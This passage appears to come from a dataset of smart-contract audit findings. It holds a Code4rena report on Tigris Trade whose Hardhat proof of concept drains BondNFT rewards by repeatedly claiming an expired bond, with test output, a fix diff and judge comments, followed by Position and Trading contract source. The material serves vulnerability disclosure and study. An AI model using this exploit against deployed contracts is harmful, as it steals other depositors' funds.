expect(st.hacker).to.be.equals(parseEther(0+700));\n+      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei);\n+      expect(st.pending2).to.be.closeTo(parseEther(100), gwei);\n+      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei);\n+\n+      // first claim of expired bond2\n+      await lock.connect(hacker).claim(2);\n+      st = await getState();\n+      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei);\n+      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei);\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(parseEther(0));\n+      expect(st.pending3).to.be.gt(parseEther(1000+1000));\n+\n+      // hack\n+      const remainReward = st.bond;\n+      let pending3 = st.pending3;\n+      let i = 0;\n+      for (; remainReward.gt(pending3); i++) {\n+        // claim expired bond2 repeatedly\n+        await lock.connect(hacker).claim(2);\n+        // pending3 keeps increasing\n+        pending3 = await bond.pending(3);\n+      }\n+      console.log(claim count: ${i}nremain: ${ethers.utils.formatEther(remainReward)}npending3: ${ethers.utils.formatEther(pending3)}n);\n+\n+      // send diff, then drain rewards in bond\n+      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward));\n+      await lock.connect(hacker).claim(3);\n+      st = await getState();\n+      // !! bond is drained !!\n+      expect(st.bond).to.be.eq(0);\n+      // !! hacker gets all rewards !!\n+      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));\n+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));\n+      expect(st.pending2).to.be.eq(0);\n+      expect(st.pending3).to.be.eq(0);\n+    });\n   });\n+\n   describe(\"Withdrawing\", function () {\n     it(\"Only expired bonds can be withdrawn\", async function () {\n       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"100\"));\n\n\nOutput:\n\n\n  Bonds\n    Rewards\nclaim count: 41\nremain: 7900.000000000000000002\npending3: 8055.7342616570405578\n\n      \u2713 Drain BondNFT rewards\n\n  1 passing (4s)\n\n\n\n\nVS Code\n\n",
                "Repair": "\nI recommend that an expired bond should be forced to release(), claim() an expired bond should revert.\n\nSample code:\n\nsolidity\n\ndiff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol\nindex 33a6e76..77e85ae 100644\n--a/contracts/BondNFT.sol\n+++ b/contracts/BondNFT.sol\n@@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         amount = bond.amount;\n         unchecked {\n             totalShares[bond.asset] -= bond.shares;\n           (uint256 _claimAmount,) = claim(_id, bond.owner);\n+            (uint256 _claimAmount,) = _claim(_id, bond.owner);\n             amount += _claimAmount;\n         }\n         asset = bond.asset;\n@@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {\n         _burn(_id);\n         emit Release(asset, lockAmount, _owner, _id);\n     }\n+\n     /\n    * @notice Claim rewards from a bond\n+     * @notice Claim rewards from an unexpired bond\n      * @dev Should only be called by a manager contract\n      * @param _id ID of the bond to claim rewards from\n      * @param _claimer address claiming rewards\n@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {\n     function claim(\n         uint _id,\n         address _claimer\n+    ) public onlyManager() returns(uint amount, address tigAsset) {\n+        Bond memory bond = idToBond(_id);\n+        require(!bond.expired, \"expired\");\n+        return _claim(_id, _claimer);\n+    }\n+\n+    /\n+     * @notice Claim rewards from a releasing bond or an unexpired bond\n+     * @param _id ID of the bond to claim rewards from\n+     * @param _claimer address claiming rewards\n+     * @return amount amount of tigAsset claimed\n+     * @return tigAsset tigAsset token address\n+     */\n+    function _claim(\n+        uint _id,\n+        address _claimer\n     ) public onlyManager() returns(uint amount, address tigAsset) {\n         Bond memory bond = idToBond(_id);\n         require(_claimer == bond.owner, \"!owner\");\n\n\nTriHaz (Tigris Trade) confirmed(https://github.com/code-423n4/2022-12-tigris-findings/issues/170)\n \nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1383192458):\n  The warden has shown how, due to an inconsistent implementation of Bond State change, how they could repeatedly claim rewards for an expired bond, stealing value from all other depositors.\n \n Because the findings doesn't just deny yield to others, but allows a single attacker to seize the majority of the yield rewards, leveraging a broken invariant, I agree with High Severity.\n\nGainsGoblin (Tigris Trade) resolved(https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1407494699):\n  Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442 \n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/IPosition.sol\";\n\ncontract Position is ERC721Enumerable, MetaContext, IPosition {\n\n    function ownerOf(uint _id) public view override(ERC721, IERC721, IPosition) returns (address) {\n        return ERC721.ownerOf(_id);\n    }\n\n    using Counters for Counters.Counter;\n    uint constant public DIVISION_CONSTANT = 1e10; // 100%\n\n    mapping(uint => mapping(address => uint)) public vaultFundingPercent;\n\n    mapping(address => bool) private _isMinter; // Trading contract should be minter\n    mapping(uint256 => Trade) private _trades; // NFT id to Trade\n\n    uint256[] private _openPositions;\n    mapping(uint256 => uint256) private _openPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _assetOpenPositions;\n    mapping(uint256 => mapping(uint256 => uint256)) private _assetOpenPositionsIndexes;\n\n    mapping(uint256 => uint256[]) private _limitOrders; // List of limit order nft ids per asset\n    mapping(uint256 => mapping(uint256 => uint256)) private _limitOrderIndexes; // Keeps track of asset -> id -> array index\n\n    // Funding\n    mapping(uint256 => mapping(address => int256)) public fundingDeltaPerSec;\n    mapping(uint256 => mapping(address => mapping(bool => int256))) private accInterestPerOi;\n    mapping(uint256 => mapping(address => uint256)) private lastUpdate;\n    mapping(uint256 => int256) private initId;\n    mapping(uint256 => mapping(address => uint256)) private longOi;\n    mapping(uint256 => mapping(address => uint256)) private shortOi;\n\n    function isMinter(address _address) public view returns (bool) { return _isMinter[_address]; }\n    function trades(uint _id) public view returns (Trade memory) {\n        Trade memory _trade = _trades[_id];\n        _trade.trader = ownerOf(_id);\n        if (_trade.orderType > 0) return _trade;\n        \n        int256 _pendingFunding;\n        if (_trade.direction && longOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(longOi[_trade.asset][_trade.tigAsset]);\n            if (longOi[_trade.asset][_trade.tigAsset] > shortOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        } else if (shortOi[_trade.asset][_trade.tigAsset] > 0) {\n            _pendingFunding = (int256(block.timestamp-lastUpdate[_trade.asset][_trade.tigAsset])*fundingDeltaPerSec[_trade.asset][_trade.tigAsset])*1e18/int256(shortOi[_trade.asset][_trade.tigAsset]);\n            if (shortOi[_trade.asset][_trade.tigAsset] > longOi[_trade.asset][_trade.tigAsset]) {\n                _pendingFunding = -_pendingFunding;\n            } else {\n                _pendingFunding = _pendingFunding*int256(1e10-vaultFundingPercent[_trade.asset][_trade.tigAsset])/1e10;\n            }\n        }\n        _trade.accInterest += (int256(_trade.margin*_trade.leverage/1e18)*(accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]+_pendingFunding)/1e18)-initId[_id];\n        \n        return _trade;\n    }\n    function openPositions() public view returns (uint256[] memory) { return _openPositions; }\n    function openPositionsIndexes(uint _id) public view returns (uint256) { return _openPositionsIndexes[_id]; }\n    function assetOpenPositions(uint _asset) public view returns (uint256[] memory) { return _assetOpenPositions[_asset]; }\n    function assetOpenPositionsIndexes(uint _asset, uint _id) public view returns (uint256) { return _assetOpenPositionsIndexes[_asset][_id]; }\n    function limitOrders(uint _asset) public view returns (uint256[] memory) { return _limitOrders[_asset]; }\n    function limitOrderIndexes(uint _asset, uint _id) public view returns (uint256) { return _limitOrderIndexes[_asset][_id]; }\n\n    Counters.Counter private _tokenIds;\n    string public baseURI;\n\n    constructor(string memory _setBaseURI, string memory _name, string memory _symbol) ERC721(_name, _symbol) {\n        baseURI = _setBaseURI;\n        _tokenIds.increment();\n    }\n\n    function _baseURI() internal override view returns (string memory) {\n        return baseURI;\n    }\n\n    function setBaseURI(string memory _newBaseURI) external onlyOwner {\n        baseURI = _newBaseURI;\n    }\n\n    /**\n    * @notice Update funding rate after open interest change\n    * @dev only callable by minter\n    * @param _asset pair id\n    * @param _tigAsset tigAsset token address\n    * @param _longOi long open interest\n    * @param _shortOi short open interest\n    * @param _baseFundingRate base funding rate of a pair\n    * @param _vaultFundingPercent percent of earned funding going to the stablevault\n    */\n    function updateFunding(uint256 _asset, address _tigAsset, uint256 _longOi, uint256 _shortOi, uint256 _baseFundingRate, uint _vaultFundingPercent) external onlyMinter {\n        if(longOi[_asset][_tigAsset] < shortOi[_asset][_tigAsset]) {\n            if (longOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][true] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n            accInterestPerOi[_asset][_tigAsset][false] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]);\n\n        } else if(longOi[_asset][_tigAsset] > shortOi[_asset][_tigAsset]) {\n            accInterestPerOi[_asset][_tigAsset][true] -= (int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(longOi[_asset][_tigAsset]);\n            if (shortOi[_asset][_tigAsset] > 0) {\n                accInterestPerOi[_asset][_tigAsset][false] += ((int256(block.timestamp-lastUpdate[_asset][_tigAsset])*fundingDeltaPerSec[_asset][_tigAsset])*1e18/int256(shortOi[_asset][_tigAsset]))*int256(1e10-vaultFundingPercent[_asset][_tigAsset])/1e10;\n            }\n        }\n        lastUpdate[_asset][_tigAsset] = block.timestamp;\n        int256 _oiDelta;\n        if (_longOi > _shortOi) {\n            _oiDelta = int256(_longOi)-int256(_shortOi);\n        } else {\n            _oiDelta = int256(_shortOi)-int256(_longOi);\n        }\n        \n        fundingDeltaPerSec[_asset][_tigAsset] = (_oiDelta*int256(_baseFundingRate)/int256(DIVISION_CONSTANT))/31536000;\n        longOi[_asset][_tigAsset] = _longOi;\n        shortOi[_asset][_tigAsset] = _shortOi;\n        vaultFundingPercent[_asset][_tigAsset] = _vaultFundingPercent;\n    }\n\n    /**\n    * @notice mint a new position nft\n    * @dev only callable by minter\n    * @param _mintTrade New trade params in struct\n    */\n    function mint(\n        MintTrade memory _mintTrade\n    ) external onlyMinter {\n        uint newTokenID = _tokenIds.current();\n\n        Trade storage newTrade = _trades[newTokenID];\n        newTrade.margin = _mintTrade.margin;\n        newTrade.leverage = _mintTrade.leverage;\n        newTrade.asset = _mintTrade.asset;\n        newTrade.direction = _mintTrade.direction;\n        newTrade.price = _mintTrade.price;\n        newTrade.tpPrice = _mintTrade.tp;\n        newTrade.slPrice = _mintTrade.sl;\n        newTrade.orderType = _mintTrade.orderType;\n        newTrade.id = newTokenID;\n        newTrade.tigAsset = _mintTrade.tigAsset;\n\n        _safeMint(_mintTrade.account, newTokenID);\n        if (_mintTrade.orderType > 0) {\n            _limitOrders[_mintTrade.asset].push(newTokenID);\n            _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;\n        } else {\n            initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;\n            _openPositions.push(newTokenID);\n            _openPositionsIndexes[newTokenID] = _openPositions.length-1;\n\n            _assetOpenPositions[_mintTrade.asset].push(newTokenID);\n            _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;\n        }\n        _tokenIds.increment();\n    }\n\n    /**\n     * @param _id id of the position NFT\n     * @param _price price used for execution\n     * @param _newMargin margin after fees\n     */\n    function executeLimitOrder(uint256 _id, uint256 _price, uint256 _newMargin) external onlyMinter {\n        Trade storage _trade = _trades[_id];\n        if (_trade.orderType == 0) {\n            return;\n        }\n        _trade.orderType = 0;\n        _trade.price = _price;\n        _trade.margin = _newMargin;\n        uint _asset = _trade.asset;\n        _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n        delete _limitOrderIndexes[_asset][_id];\n        _limitOrders[_asset].pop();\n\n        _openPositions.push(_id);\n        _openPositionsIndexes[_id] = _openPositions.length-1;\n        _assetOpenPositions[_asset].push(_id);\n        _assetOpenPositionsIndexes[_asset][_id] = _assetOpenPositions[_asset].length-1;\n\n        initId[_id] = accInterestPerOi[_trade.asset][_trade.tigAsset][_trade.direction]*int256(_trade.margin*_trade.leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice modifies margin and leverage\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newLeverage new leverage amount\n    */\n    function modifyMargin(uint256 _id, uint256 _newMargin, uint256 _newLeverage) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].leverage = _newLeverage;\n    }\n\n    /**\n    * @notice modifies margin and entry price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _newMargin new margin amount\n    * @param _newPrice new entry price\n    */\n    function addToPosition(uint256 _id, uint256 _newMargin, uint256 _newPrice) external onlyMinter {\n        _trades[_id].margin = _newMargin;\n        _trades[_id].price = _newPrice;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_newMargin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice Called before updateFunding for reducing position or adding to position, to store accumulated funding\n    * @dev only callable by minter\n    * @param _id position id\n    */\n    function setAccInterest(uint256 _id) external onlyMinter {\n        _trades[_id].accInterest = trades(_id).accInterest;\n    }\n\n    /**\n    * @notice Reduces position size by %\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _percent percent of a position being closed\n    */\n    function reducePosition(uint256 _id, uint256 _percent) external onlyMinter {\n        _trades[_id].accInterest -= _trades[_id].accInterest*int256(_percent)/int256(DIVISION_CONSTANT);\n        _trades[_id].margin -= _trades[_id].margin*_percent/DIVISION_CONSTANT;\n        initId[_id] = accInterestPerOi[_trades[_id].asset][_trades[_id].tigAsset][_trades[_id].direction]*int256(_trades[_id].margin*_trades[_id].leverage/1e18)/1e18;\n    }\n\n    /**\n    * @notice change a position tp price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _tpPrice tp price\n    */\n    function modifyTp(uint _id, uint _tpPrice) external onlyMinter {\n        _trades[_id].tpPrice = _tpPrice;\n    }\n\n    /**\n    * @notice change a position sl price\n    * @dev only callable by minter\n    * @param _id position id\n    * @param _slPrice sl price\n    */\n    function modifySl(uint _id, uint _slPrice) external onlyMinter {\n        _trades[_id].slPrice = _slPrice;\n    }\n\n    /**\n    * @dev Burns an NFT and it's data\n    * @param _id ID of the trade\n    */\n    function burn(uint _id) external onlyMinter {\n        _burn(_id);\n        uint _asset = _trades[_id].asset;\n        if (_trades[_id].orderType > 0) {\n            _limitOrderIndexes[_asset][_limitOrders[_asset][_limitOrders[_asset].length-1]] = _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset][_limitOrderIndexes[_asset][_id]] = _limitOrders[_asset][_limitOrders[_asset].length-1];\n            delete _limitOrderIndexes[_asset][_id];\n            _limitOrders[_asset].pop();            \n        } else {\n            _assetOpenPositionsIndexes[_asset][_assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1]] = _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset][_assetOpenPositionsIndexes[_asset][_id]] = _assetOpenPositions[_asset][_assetOpenPositions[_asset].length-1];\n            delete _assetOpenPositionsIndexes[_asset][_id];\n            _assetOpenPositions[_asset].pop();  \n\n            _openPositionsIndexes[_openPositions[_openPositions.length-1]] = _openPositionsIndexes[_id];\n            _openPositions[_openPositionsIndexes[_id]] = _openPositions[_openPositions.length-1];\n            delete _openPositionsIndexes[_id];\n            _openPositions.pop();              \n        }\n        delete _trades[_id];\n    }\n\n    function assetOpenPositionsLength(uint _asset) external view returns (uint256) {\n        return _assetOpenPositions[_asset].length;\n    }\n\n    function limitOrdersLength(uint _asset) external view returns (uint256) {\n        return _limitOrders[_asset].length;\n    }\n\n    function getCount() external view returns (uint) {\n        return _tokenIds.current();\n    }\n\n    function userTrades(address _user) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](balanceOf(_user));\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = tokenOfOwnerByIndex(_user, i);\n        }\n        return _ids;\n    }\n\n    function openPositionsSelection(uint _from, uint _to) external view returns (uint[] memory) {\n        uint[] memory _ids = new uint[](_to-_from);\n        for (uint i=0; i<_ids.length; i++) {\n            _ids[i] = _openPositions[i+_from];\n        }\n        return _ids;\n    }\n\n    function setMinter(address _minter, bool _bool) external onlyOwner {\n        _isMinter[_minter] = _bool;\n    }    \n\n    modifier onlyMinter() {\n        require(_isMinter[_msgSender()], \"!Minter\");\n        _;\n    }\n\n    // META-TX\n    function _msgSender() internal view override(Context, MetaContext) returns (address sender) {\n        return MetaContext._msgSender();\n    }\n    function _msgData() internal view override(Context, MetaContext) returns (bytes calldata) {\n        return MetaContext._msgData();\n    }\n}\n\n//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"./utils/MetaContext.sol\";\nimport \"./interfaces/ITrading.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"./interfaces/IPairsContract.sol\";\nimport \"./interfaces/IReferrals.sol\";\nimport \"./interfaces/IPosition.sol\";\nimport \"./interfaces/IGovNFT.sol\";\nimport \"./interfaces/IStableVault.sol\";\nimport \"./utils/TradingLibrary.sol\";\n\ninterface ITradingExtension {\n    function getVerifiedPrice(\n        uint _asset,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        uint _withSpreadIsLong\n    ) external returns(uint256 _price, uint256 _spread);\n    function getRef(\n        address _trader\n    ) external pure returns(address);\n    function _setReferral(\n        bytes32 _referral,\n        address _trader\n    ) external;\n    function validateTrade(uint _asset, address _tigAsset, uint _margin, uint _leverage) external view;\n    function isPaused() external view returns(bool);\n    function minPos(address) external view returns(uint);\n    function modifyLongOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function modifyShortOi(\n        uint _asset,\n        address _tigAsset,\n        bool _onOpen,\n        uint _size\n    ) external;\n    function paused() external returns(bool);\n    function _limitClose(\n        uint _id,\n        bool _tp,\n        PriceData calldata _priceData,\n        bytes calldata _signature\n    ) external returns(uint _limitPrice, address _tigAsset);\n    function _checkGas() external view;\n    function _closePosition(\n        uint _id,\n        uint _price,\n        uint _percent\n    ) external returns (IPosition.Trade memory _trade, uint256 _positionSize, int256 _payout);\n}\n\ninterface IStable is IERC20 {\n    function burnFrom(address account, uint amount) external;\n    function mintFor(address account, uint amount) external;\n}\n\ninterface ExtendedIERC20 is IERC20 {\n    function decimals() external view returns (uint);\n}\n\ninterface ERC20Permit is IERC20 {\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external;\n}\n\ncontract Trading is MetaContext, ITrading {\n\n    error LimitNotSet(); //7\n    error NotLiquidatable();\n    error TradingPaused();\n    error BadDeposit();\n    error BadWithdraw();\n    error ValueNotEqualToMargin();\n    error BadLeverage();\n    error NotMargin();\n    error NotAllowedPair();\n    error BelowMinPositionSize();\n    error BadClosePercent();\n    error NoPrice();\n    error LiqThreshold();\n\n    uint constant private DIVISION_CONSTANT = 1e10; // 100%\n    uint private constant liqPercent = 9e9; // 90%\n\n    struct Fees {\n        uint daoFees;\n        uint burnFees;\n        uint referralFees;\n        uint botFees;\n    }\n    Fees public openFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    Fees public closeFees = Fees(\n        0,\n        0,\n        0,\n        0\n    );\n    uint public limitOrderPriceRange = 1e8; // 1%\n\n    uint public maxWinPercent;\n    uint public vaultFundingPercent;\n\n    IPairsContract private pairsContract;\n    IPosition private position;\n    IGovNFT private gov;\n    ITradingExtension private tradingExtension;\n\n    struct Delay {\n        uint delay; // Block number where delay ends\n        bool actionType; // True for open, False for close\n    }\n    mapping(uint => Delay) public blockDelayPassed; // id => Delay\n    uint public blockDelay;\n    mapping(uint => uint) public limitDelay; // id => block.timestamp\n\n    mapping(address => bool) public allowedVault;\n\n    struct Proxy {\n        address proxy;\n        uint256 time;\n    }\n\n    mapping(address => Proxy) public proxyApprovals;\n\n    constructor(\n        address _position,\n        address _gov,\n        address _pairsContract\n    )\n    {\n        position = IPosition(_position);\n        gov = IGovNFT(_gov);\n        pairsContract = IPairsContract(_pairsContract);\n    }\n\n    // ===== END-USER FUNCTIONS =====\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateMarketOrder(\n        TradeInfo calldata _tradeInfo,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(position.getCount(), true);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        uint256 _marginAfterFees = _tradeInfo.margin - _handleOpenFees(_tradeInfo.asset, _tradeInfo.margin*_tradeInfo.leverage/1e18, _trader, _tigAsset, false);\n        uint256 _positionSize = _marginAfterFees * _tradeInfo.leverage / 1e18;\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        uint256 _isLong = _tradeInfo.direction ? 1 : 2;\n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_tradeInfo.asset, _priceData, _signature, _isLong);\n        IPosition.MintTrade memory _mintTrade = IPosition.MintTrade(\n            _trader,\n            _marginAfterFees,\n            _tradeInfo.leverage,\n            _tradeInfo.asset,\n            _tradeInfo.direction,\n            _price,\n            _tradeInfo.tpPrice,\n            _tradeInfo.slPrice,\n            0,\n            _tigAsset\n        );\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        unchecked {\n            if (_tradeInfo.direction) {\n                tradingExtension.modifyLongOi(_tradeInfo.asset, _tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_tradeInfo.asset, _tigAsset, true, _positionSize);\n            }\n        }\n        _updateFunding(_tradeInfo.asset, _tigAsset);\n        position.mint(\n            _mintTrade\n        );\n        unchecked {\n            emit PositionOpened(_tradeInfo, 0, _price, position.getCount()-1, _trader, _marginAfterFees);\n        }   \n    }\n\n    /**\n     * @dev initiate closing position\n     * @param _id id of the position NFT\n     * @param _percent percent of the position being closed in BP\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _outputToken Token received upon closing trade\n     * @param _trader address the trade is initiated for\n     */\n    function initiateCloseOrder(\n        uint _id,\n        uint _percent,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _outputToken,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkDelay(_id, false);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _outputToken);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit        \n        (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, 0);\n\n        if (_percent > DIVISION_CONSTANT || _percent == 0) revert BadClosePercent();\n        _closePosition(_id, _percent, _price, _stableVault, _outputToken, false); \n    }\n\n    /**\n     * @param _id position id\n     * @param _addMargin margin amount used to add to the position\n     * @param _priceData verifiable off-chain price data\n     * @param _signature node signature\n     * @param _stableVault StableVault address\n     * @param _marginAsset Token being used to add to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addToPosition(\n        uint _id,\n        uint _addMargin,\n        PriceData calldata _priceData,\n        bytes calldata _signature,\n        address _stableVault,\n        address _marginAsset,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkDelay(_id, true);\n        IPosition.Trade memory _trade = position.trades(_id);\n        tradingExtension.validateTrade(_trade.asset, _trade.tigAsset, _trade.margin + _addMargin, _trade.leverage);\n        _checkVault(_stableVault, _marginAsset);\n        if (_trade.orderType != 0) revert(\"4\"); //IsLimit\n        uint _fee = _handleOpenFees(_trade.asset, _addMargin*_trade.leverage/1e18, _trader, _trade.tigAsset, false);\n        _handleDeposit(\n            _trade.tigAsset,\n            _marginAsset,\n            _addMargin - _fee,\n            _stableVault,\n            _permitData,\n            _trader\n        );\n        position.setAccInterest(_id);\n        unchecked {\n            (uint256 _price,) = tradingExtension.getVerifiedPrice(_trade.asset, _priceData, _signature, _trade.direction ? 1 : 2);\n            uint _positionSize = (_addMargin - _fee) * _trade.leverage / 1e18;\n            if (_trade.direction) {\n                tradingExtension.modifyLongOi(_trade.asset, _trade.tigAsset, true, _positionSize);\n            } else {\n                tradingExtension.modifyShortOi(_trade.asset, _trade.tigAsset, true, _positionSize);     \n            }\n            _updateFunding(_trade.asset, _trade.tigAsset);\n            _addMargin -= _fee;\n            uint _newMargin = _trade.margin + _addMargin;\n            uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;\n\n            position.addToPosition(\n                _trade.id,\n                _newMargin,\n                _newPrice\n            );\n            \n            emit AddToPosition(_trade.id, _newMargin, _newPrice, _trade.trader);\n        }\n    }\n\n    /**\n     * @param _tradeInfo Trade info\n     * @param _orderType type of limit order used to open the position\n     * @param _price limit price\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function initiateLimitOrder(\n        TradeInfo calldata _tradeInfo,\n        uint256 _orderType, // 1 limit, 2 stop\n        uint256 _price,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        address _tigAsset = IStableVault(_tradeInfo.stableVault).stable();\n        tradingExtension.validateTrade(_tradeInfo.asset, _tigAsset, _tradeInfo.margin, _tradeInfo.leverage);\n        _checkVault(_tradeInfo.stableVault, _tradeInfo.marginAsset);\n        if (_orderType == 0) revert(\"5\");\n        if (_price == 0) revert NoPrice();\n        tradingExtension._setReferral(_tradeInfo.referral, _trader);\n        _handleDeposit(_tigAsset, _tradeInfo.marginAsset, _tradeInfo.margin, _tradeInfo.stableVault, _permitData, _trader);\n        _checkSl(_tradeInfo.slPrice, _tradeInfo.direction, _price);\n        uint256 _id = position.getCount();\n        position.mint(\n            IPosition.MintTrade(\n                _trader,\n                _tradeInfo.margin,\n                _tradeInfo.leverage,\n                _tradeInfo.asset,\n                _tradeInfo.direction,\n                _price,\n                _tradeInfo.tpPrice,\n                _tradeInfo.slPrice,\n                _orderType,\n                _tigAsset\n            )\n        );\n        limitDelay[_id] = block.timestamp + 4;\n        emit PositionOpened(_tradeInfo, _orderType, _price, _id, _trader, _tradeInfo.margin);\n    }\n\n    /**\n     * @param _id position ID\n     * @param _trader address the trade is initiated for\n     */\n    function cancelLimitOrder(\n        uint256 _id,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType == 0) revert();\n        IStable(_trade.tigAsset).mintFor(_trader, _trade.margin);\n        position.burn(_id);\n        emit LimitCancelled(_id, _trader);\n    }\n\n    /**\n     * @param _id position id\n     * @param _marginAsset Token being used to add to the position\n     * @param _stableVault StableVault address\n     * @param _addMargin margin amount being added to the position\n     * @param _permitData data and signature needed for token approval\n     * @param _trader address the trade is initiated for\n     */\n    function addMargin(\n        uint256 _id,\n        address _marginAsset,\n        address _stableVault,\n        uint256 _addMargin,\n        ERC20PermitData calldata _permitData,\n        address _trader\n    )\n        external\n    {\n        _validateProxy(_trader);\n        _checkOwner(_id, _trader);\n        _checkVault(_stableVault, _marginAsset);\n        IPosition.Trade memory _trade = position.trades(_id);\n        if (_trade.orderType != 0) revert(); //IsLimit\n        IPairsContract.Asset memory asset = pairsContract.idToAsset(_trade.asset);\n        _handleDeposit(_trade.tigAsset, _marginAsset, _addMargin, _stableVault, _permitData, _trader);\n        unchecked {\n            uint256 _newMargin = _trade.margin + _addMargin;\n            uint256 _newLeverage = _trade.margin * _trade.leverage / _newMargin;\n            if (_newLeverage < asset.minLeverage) 